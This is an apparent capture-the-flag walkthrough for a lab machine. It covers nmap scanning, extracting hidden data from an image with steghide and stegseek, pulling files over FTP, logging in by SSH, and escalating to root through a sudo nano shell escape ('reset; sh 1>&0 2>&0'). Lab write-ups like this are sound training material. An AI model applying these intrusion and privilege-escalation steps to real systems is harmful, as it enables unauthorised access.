## Recon

- Run full nmap scan (verbose, service/version, OS and scripts, skip ping):
    

`nmap -v -A -Pn 10.201.52.216`

## Web app enumeration

1. Open the web page in browser:
    
    - `http://10.201.52.216` (or the target IP shown in the room)
        
2. View page source (browser → View Source)
    
    - Found comment: `<!-- Have you ever heard of steganography? -->` → hint to check image for hidden data.
        

## Steganography

1. Download the image from the target (from the box itself or via wget):
    

`wget http://10.201.52.216/brooklyn99.jpg`

2. Try `steghide` with an empty passphrase:
    

`steghide extract -sf brooklyn99.jpg -p ""`

3. If steghide fails or compressed data is corrupted, use `stegseek` (more tolerant):
    

`stegseek brooklyn99.jpg`

- `stegseek` should extract the hidden message / file (note.txt or similar).
    

## FTP enumeration

1. Connect to FTP (if port open):
    

`ftp 10.201.52.216 # then inside ftp: ls ; get <filename>`

2. Downloaded files:
    
    - `file1` — contains a password (used later)
        
    - `file2` — just a note (no creds)
        

## SSH — initial access

- Use the username/password discovered (`hol` and password found in FTP or steg file):
    

`ssh hol@10.201.52.216`

- Once connected:
    
    - `cat user.txt` → this is **user flag**.
        

## Privilege escalation — find root

1. Check sudo permissions:
    

`sudo -l`

- Output shows:
    

`(ALL) NOPASSWD: /bin/nano`

2. Use GTFOBins technique for `nano` to get a root shell:
    
    - Start nano as sudo:
        

`sudo /bin/nano`

- In nano use the keystroke sequence that spawns a shell:
    
    - Press `Ctrl+R` then `Ctrl+X`, then enter:
        

`reset; sh 1>&0 2>&0`

- After that you should have a root shell (`whoami` → `root`).
    

3. Grab root flag:
    

`cd /root ls cat root.txt`